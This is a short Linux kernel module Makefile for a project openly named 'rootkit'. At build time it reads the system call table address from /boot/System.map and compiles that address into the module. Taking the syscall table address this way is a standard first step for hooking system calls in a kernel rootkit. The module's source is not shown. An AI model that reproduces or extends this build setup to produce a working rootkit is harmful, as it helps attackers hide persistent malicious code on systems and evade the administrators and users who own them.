obj-m += rootkit.o

ROOTKIT_SYSCALL_TABLE="0x$(shell grep sys_call_table /boot/System.map-$(shell uname -r) | head -1 | cut -d " " -f1)"

ccflags-y += -DROOTKIT_SYSCALL_TABLE=$(ROOTKIT_SYSCALL_TABLE)

all:
	@echo "Syscall table detected at $(ROOTKIT_SYSCALL_TABLE)"
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
